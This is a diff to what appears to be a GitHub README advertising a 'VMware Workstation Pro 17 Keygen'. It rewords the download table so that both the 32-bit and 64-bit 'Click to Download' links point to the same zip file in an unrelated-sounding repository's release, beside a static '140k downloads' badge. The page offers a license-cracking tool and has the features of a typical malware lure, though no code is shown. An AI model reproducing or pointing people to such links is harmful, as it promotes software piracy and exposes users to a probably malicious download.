@@ -3,11 +3,13 @@
 
 <h1>VMware Workstation Pro 17 Keygen - DOWNLOAD </h1>
 
-<p dir="ltr"><img src="https://github.com/user-attachments/assets/7e78c03f-7b1d-42e9-a8ab-ce5e89ce1d18" alt="VMware Workstation Pro 17" style="max-width: 100%;"></p>
-
 | Downloads | For Windows 32 | For Windows 64 |
 |:-------------:| :-----:| :--------:|
-| ![Downloads](https://img.shields.io/badge/Downloads-140k-darkcyan) | [Download For Windows 32](https://github.com/Aryadinfandy/studious-computing-machine/releases/download/1/Vmware_Workstation_17_pro.zip) | [Download For Windows 64](https://github.com/Aryadinfandy/studious-computing-machine/releases/download/1/Vmware_Workstation_17_pro.zip) |
+| ![Downloads](https://img.shields.io/badge/Downloads-140k-darkcyan) | [Click to Download](https://github.com/Aryadinfandy/studious-computing-machine/releases/download/1/Vmware_Workstation_17_pro.zip) | [Click to Download](https://github.com/Aryadinfandy/studious-computing-machine/releases/download/1/Vmware_Workstation_17_pro.zip) |
+
+<p dir="ltr"><img src="https://github.com/user-attachments/assets/7e78c03f-7b1d-42e9-a8ab-ce5e89ce1d18" alt="VMware Workstation Pro 17" style="max-width: 100%;"></p>
+
+
 
 
 
